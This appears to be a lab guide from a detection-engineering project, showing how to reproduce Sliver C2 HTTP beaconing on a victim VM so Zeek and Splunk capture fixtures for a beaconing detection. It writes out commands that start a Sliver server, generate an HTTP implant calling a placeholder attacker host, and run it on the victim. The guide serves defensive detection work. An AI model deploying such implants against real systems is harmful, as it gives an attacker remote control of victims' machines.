# Attack reproduction — Sliver HTTP beaconing

Stand up a Sliver server, generate an HTTP implant, run it on a victim in
the lab subnet that Zeek is sniffing. The default Sliver HTTP listener
beacons every 60s with no jitter — this fires the detection cleanly. Ratchet
up `--jitter` to test the tuning knobs.

## Prereqs

- Sliver server (Linux, Docker is fine: `ghcr.io/bishopfox/sliver-server`)
- Victim VM on the lab bridge network (any Linux/Windows reachable to the C2)
- Lab compose stack running so Zeek + Splunk are capturing

## Run (high level)

```bash
# Server
docker run --rm -it --name sliver-server -p 31337:31337 -p 80:80 -p 443:443 \
  ghcr.io/bishopfox/sliver-server

# Inside the server console:
> http
> generate --http <attacker_ip> --os linux --arch amd64 --save /tmp/implant
> exit

# Copy /tmp/implant to the victim, then on the victim:
chmod +x ./implant && ./implant
# Implant beacons every 60s by default
```

For a jittered beacon to test detection limits:
```
> generate --http <attacker_ip> --jitter 30 --reconnect 60s --save /tmp/jittered
```

## Capture telemetry into a fixture

```bash
# After ~15 minutes:
docker exec detlab-zeek cat /usr/local/zeek/logs/current/conn.log \
  | jq -c "select(.\"id.resp_h\" == \"<attacker_ip>\")" \
  > /tmp/sliver_capture.log

# Trim and copy:
head -100 /tmp/sliver_capture.log > tests/positive_conn.log
```

## Safety / scope

- Lab use only.
- Sliver is a legitimate security-testing framework. Running it in a lab
  for detection development is unambiguously defensive work.
- The synthetic `tests/positive_conn.log` shipped here is generated by
  `scripts/generate_fixtures.py` so the test suite is hermetic.
